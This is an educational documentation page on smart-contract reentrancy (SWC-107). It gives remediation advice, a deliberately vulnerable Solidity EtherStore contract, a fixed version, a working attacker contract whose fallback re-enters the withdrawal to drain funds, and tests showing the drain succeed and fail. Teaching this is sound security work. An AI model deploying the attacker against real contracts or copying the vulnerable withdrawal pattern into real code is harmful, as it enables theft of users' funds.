107-Reentrancy
==============

Adapted From
`SWC 107 <https://swcregistry.io/docs/SWC-107>`_.

Description
-----------

A contract may call another contract. This hands over control flow to
the callee. The external contract can then take over control flow to
call back into the calling contract before the first invocation of
the function is finished. This may cause the different invocations
of the function to interact in undesirable ways.

Remediation
-----------

The best practices to avoid Reentrancy weaknesses are:

- Make sure all internal state changes are performed before the call
  is executed. This is known as the Checks-Effects-Interactions pattern.
- Use a reentrancy lock (i.e. OpenZeppelin's
  `ReentrancyGuard <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol>`_)

Examples
--------

EtherStore
^^^^^^^^^^^^^^^^

.. code-block:: solidity
   :linenos:
   :emphasize-lines: 14,16,34,35
   
   contract EtherStore {
       uint256 public withdrawalLimit = 1 ether;
       mapping(address => uint256) public lastWithdrawTime;
       mapping(address => uint256) public balances;
       
       function depositFunds() public payable {
           balances[msg.sender] += msg.value;
       }
       
       function withdrawFunds(uint256 _weiToWithdraw) public {
           require(balances[msg.sender] >= _weiToWithdraw, "Insufficient Balance");
           require(_weiToWithdraw <= withdrawalLimit, "Over Withdrawal Limit");
           require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "Withdraw too soon after last");
           (bool success, bytes memory returnData) = msg.sender.call{ value: _weiToWithdraw }("");
           require(success, "Call Failed");
           balances[msg.sender] -= _weiToWithdraw;
           lastWithdrawTime[msg.sender] = block.timestamp;
       }
   }
   
   contract EtherStoreFixed {
       uint256 public withdrawalLimit = 1 ether;
       mapping(address => uint256) public lastWithdrawTime;
       mapping(address => uint256) public balances;
       
       function depositFunds() public payable {
           balances[msg.sender] += msg.value;
       }
       
       function withdrawFunds(uint256 _weiToWithdraw) public {
           require(balances[msg.sender] >= _weiToWithdraw, "Insufficient Balance");
           require(_weiToWithdraw <= withdrawalLimit, "Over Withdrawal Limit");
           require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "Withdraw too soon after last");
           balances[msg.sender] -= _weiToWithdraw;
           (bool success, bytes memory returnData) = msg.sender.call{ value: _weiToWithdraw }("");
           require(success, "Call Failed");
           lastWithdrawTime[msg.sender] = block.timestamp;
       }
   }
   
   contract EtherStoreAttacker {
       EtherStore public etherStore;
       
       constructor(address etherStoreAddress) {
           etherStore = EtherStore(etherStoreAddress);
       }
       
       function attackEtherStore() public payable {
           require(msg.value >= 1 ether, "Insufficient ether provided");
           etherStore.depositFunds{ value: 1 ether }();
           etherStore.withdrawFunds(1 ether);
       }
       
       function collectEther() public {
           msg.sender.transfer(address(this).balance);
       }
       
       receive () external payable {
           if(address(etherStore).balance >= 1 ether){
               etherStore.withdrawFunds(1 ether);
           }
       }
   }


Contract Interfaces
-------------------

EtherStore
^^^^^^^^^^^^^^^^

.. autosolcontract:: EtherStore
   :members:
   :undoc-members:

.. autosolcontract:: EtherStoreAttacker
   :members:
   :undoc-members:

.. autosolcontract:: EtherStoreFixed
   :members:
   :undoc-members:

.. autosolcontract:: EtherStoreFixedAttacker
   :members:
   :undoc-members:

Tests
-----

EtherStore
^^^^^^^^^^

.. code-block:: javascript
   :linenos:

   it(
      "vulnerable to reentrancy attack",
      async function(){
         let etherStore = await EtherStore.new({ from: funder });
         let etherStoreAttacker = await EtherStoreAttacker.new(etherStore.address, { from: attacker });
            
         await etherStore.depositFunds({ from: funder, value: ether("1") });
         await etherStore.depositFunds({ from: user1, value: ether("1") });
         await etherStore.depositFunds({ from: user2, value: ether("1") });
         await etherStore.depositFunds({ from: attacker, value: ether("1") });
            
         let initEtherStoreBalance = await getBal(etherStore.address);
            
         await etherStoreAttacker.attackEtherStore({ from: attacker, value: ether("1") });
            
         let finalEtherStoreBalance = await getBal(etherStore.address);
         let etherStoreAttackerBalance = await getBal(etherStoreAttacker.address);
            
         expect(finalEtherStoreBalance).to.be.bignumber.equal(new BN("0"));
         expect(etherStoreAttackerBalance).to.be.bignumber.equal(initEtherStoreBalance.add(ether("1")));
            
      }
   );

EtherStoreFixed
^^^^^^^^^^^^^^^
   
.. code-block:: javascript
   :linenos:

   it(
      "not vulnerable to reentrancy attack",
      async function(){
         let etherStore = await EtherStoreFixed.new({ from: funder });
         let etherStoreAttacker = await EtherStoreFixedAttacker.new(etherStore.address, { from: attacker });
               
         await etherStore.depositFunds({ from: funder, value: ether("1") });
         await etherStore.depositFunds({ from: user1, value: ether("1") });
         await etherStore.depositFunds({ from: user2, value: ether("1") });
         await etherStore.depositFunds({ from: attacker, value: ether("1") });
               
         let initEtherStoreBalance = await getBal(etherStore.address);
               
         await expectRevert(
            etherStoreAttacker.attackEtherStore({ from: attacker, value: ether("1") }),
            "Call Failed"
         );
      }
   );
